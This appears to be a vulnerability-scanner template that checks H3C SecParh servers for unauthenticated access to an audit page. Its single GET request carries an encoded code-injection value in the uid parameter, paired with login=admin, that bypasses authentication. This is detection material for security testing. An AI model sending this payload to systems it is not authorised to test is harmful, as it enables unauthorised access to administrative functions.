id: unauthorized-h3csecparh-login
brief:
    title: H3C Server - Unauthenticated Access
    by: ritikchaddha
    level: high
    about: H3C server was able to be accessed with no authentication requirements in place.
    label:
        - h3c
        - default-login
        - unauth
        - misconfig
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin'
      signs:
        - "on": word
          has:
            - admin
            - 审计管理员
            - 错误的id
          in: body
          need: all
        - "on": status
          status:
            - 200
